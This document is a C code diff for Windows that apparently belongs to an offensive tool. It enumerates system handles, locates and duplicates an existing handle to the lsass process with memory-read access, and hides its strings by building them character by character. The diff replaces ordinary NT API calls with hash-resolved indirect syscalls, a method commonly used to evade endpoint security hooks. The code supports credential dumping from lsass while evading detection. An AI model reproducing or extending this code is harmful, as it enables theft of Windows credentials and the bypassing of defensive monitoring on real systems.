@@ -8,8 +8,16 @@ PSYSTEM_HANDLE_INFORMATION get_handles(struct fPtrs* ptr_functions) {
     ULONG                       bufferSize = 0;
     PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
 
+    DWORD dwSuccess = FAIL;
+    Syscall sysNtQuerySystemInformation = { 0x00 };
+
+    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
+    if(dwSuccess == FAIL)
+      goto exit;
+
     do {
-        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);
+        PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
+        status = DoSyscall((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);
         if (!NT_SUCCESS(status)) {
             if (status == STATUS_INFO_LENGTH_MISMATCH) {
                 if (buffer != NULL)
@@ -24,6 +32,8 @@ PSYSTEM_HANDLE_INFORMATION get_handles(struct fPtrs* ptr_functions) {
             break;
         }
     } while (1);
+
+exit:
 
     return handleInfo;
 
@@ -49,6 +59,21 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
     wchar_t str_process[] = { L'P',L'r',L'o',L'c',L'e',L's',L's', 0x00 };
     char str_lsass[] = { 'l','s','a','s','s', 0x00 };
 
+    DWORD dwSuccess = FAIL;
+    Syscall sysNtOpenProcess = { 0x00 }, sysNtDuplicateObject = { 0x00 }, sysNtQueryObject = { 0x00 };
+
+    dwSuccess = getSyscall(0x1141831c, &sysNtOpenProcess);
+    if(dwSuccess == FAIL)
+      goto exit;
+
+    dwSuccess = getSyscall(0x62caad5d, &sysNtDuplicateObject);
+    if(dwSuccess == FAIL)
+      goto exit;
+
+    dwSuccess = getSyscall(0x60c355b0, &sysNtQueryObject);
+    if(dwSuccess == FAIL)
+      goto exit;
+
     for (idx_handle = 0; idx_handle < handle_info->HandleCount; idx_handle++) {
 
         entry_info = &handle_info->Handles[idx_handle];
@@ -67,26 +92,37 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
             uPid.UniqueProcess = entry_info->ProcessId;
             uPid.UniqueThread = 0;
 
-            NtOpenProcess(&h_process, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, &ObjectAttributes, &uPid);
-            NtDuplicateObject(h_process, (HANDLE)(uint64_t)entry_info->Handle, NtCurrentProcess(), &dupHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, 0);
+            PrepareSyscall(sysNtOpenProcess.dwSyscallNr, sysNtOpenProcess.pRecycledGate);
+            status = DoSyscall(&h_process, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, &ObjectAttributes, &uPid);
+            if (!NT_SUCCESS(status)){
+                goto cleanup;
+            }
+
+            PrepareSyscall(sysNtDuplicateObject.dwSyscallNr, sysNtDuplicateObject.pRecycledGate);
+            status = DoSyscall(h_process, (HANDLE)(uint64_t)entry_info->Handle, NtCurrentProcess(), &dupHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, 0);
+            if (!NT_SUCCESS(status)) {
+                goto cleanup;
+            }
 
             objectTypeInfo = (POBJECT_TYPE_INFORMATION)ptr_functions->_VirtualAlloc(0, 0x1000, MEM_COMMIT, PAGE_READWRITE);
-            if (objectTypeInfo == NULL)
-                continue;
+            if (objectTypeInfo == NULL) {
+                goto cleanup;
+            }
 
-            status = NtQueryObject(dupHandle, (OBJECT_INFORMATION_CLASS)ObjectTypeInformation, objectTypeInfo, 0x1000, NULL);
+            PrepareSyscall(sysNtQueryObject.dwSyscallNr, sysNtQueryObject.pRecycledGate);
+            status = DoSyscall(dupHandle, (OBJECT_INFORMATION_CLASS)ObjectTypeInformation, objectTypeInfo, 0x1000, NULL);
             if (!NT_SUCCESS(status)){
-                continue;
+                goto cleanup;
             }
 
             if (ptr_functions->_strcmpW(objectTypeInfo->TypeName.pBuffer, str_process))
-                continue;
+                goto cleanup;
 
             if (!ptr_functions->_GetModuleFileNameExA(dupHandle, NULL, handle_name, MAX_PATH))
-                continue;
+                goto cleanup;
 
             if (!ptr_functions->_GetProcessImageFileNameA(h_process, process_path, MAX_PATH))
-                continue;
+                goto cleanup;
 
             if (ptr_functions->_strstrA(handle_name, str_lsass) != NULL && (((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ) & entry_info->GrantedAccess) != 0)) {
 
@@ -108,13 +144,25 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
                 
                 if (in_pid)
                     break;
-                else
-                    ptr_functions->_CloseHandle(h_return);
 
             }
+
+cleanup:
+            if(dupHandle) {
+                ptr_functions->_CloseHandle(dupHandle);
+                dupHandle = NULL;
+            }
+
+            if(h_process) {
+                ptr_functions->_CloseHandle(h_process);
+                h_process = NULL;
+            }
+
         }
 
     }
+
+exit:
 
     if (h_process != NULL)
         ptr_functions->_CloseHandle(h_process);
